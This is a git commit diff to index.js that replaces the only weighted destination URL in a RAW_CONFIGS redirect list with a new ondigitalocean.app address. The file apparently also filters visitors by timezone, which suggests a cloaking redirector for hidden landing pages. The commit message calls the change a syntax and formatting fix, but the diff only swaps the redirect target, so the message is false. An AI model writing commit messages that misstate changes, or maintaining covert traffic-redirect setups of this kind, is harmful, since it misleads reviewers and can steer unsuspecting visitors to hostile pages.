1a650b4c4adcfbea21959c1a540a38c97899d1e4
paalakash <palaksh452@gmail.com>
2026-06-25 07:19:41 +0530

    Fix syntax errors in RAW_CONFIGS array
    Corrected formatting and syntax issues in the RAW_CONFIGS array.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sea-turtle-app-u9aj8.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://coral-app-2-6l3t7.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
